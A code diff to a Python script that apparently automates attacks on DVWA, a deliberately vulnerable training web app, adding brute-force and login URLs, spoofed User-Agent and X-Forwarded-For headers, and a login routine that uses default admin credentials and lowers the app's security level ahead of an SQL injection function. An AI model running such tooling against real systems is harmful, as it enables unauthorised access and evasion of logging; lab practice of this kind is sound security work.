@@ -25,9 +25,37 @@ delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unr
 
 sqli_url = f"{base_url}/vulnerabilities/sqli/"
 
+# Construct the target URL for brute force attacks
+target_url = f"{base_url}/vulnerabilities/brute/"
+login_url = f"{base_url}/login.php"
+security_url = f"{base_url}/security.php"
+
+# Headers to spoof User-Agent and IP address
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+    'X-Forwarded-For': '192.168.1.1'
+}
+
 def login_and_setup_security():
-    # Assuming login is required; adjust as necessary
-    pass
+    #response = session.get(login_url)
+    data = {
+        'username': 'admin',
+        'password': 'password',
+        'Login': 'Login',
+    }
+    response = session.post(login_url, data=data, headers=headers)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
+    time.sleep(delay) 
+    
+    #response = session.get(security_url)
+    data = {
+        'security': 'low',
+        'seclev_submit': 'Submit',
+        'user_token': user_token
+    }
+    session.post(security_url, data=data, headers=headers)
+    time.sleep(delay) 
 
 def sql_injection_attack():
     total_tests = 0
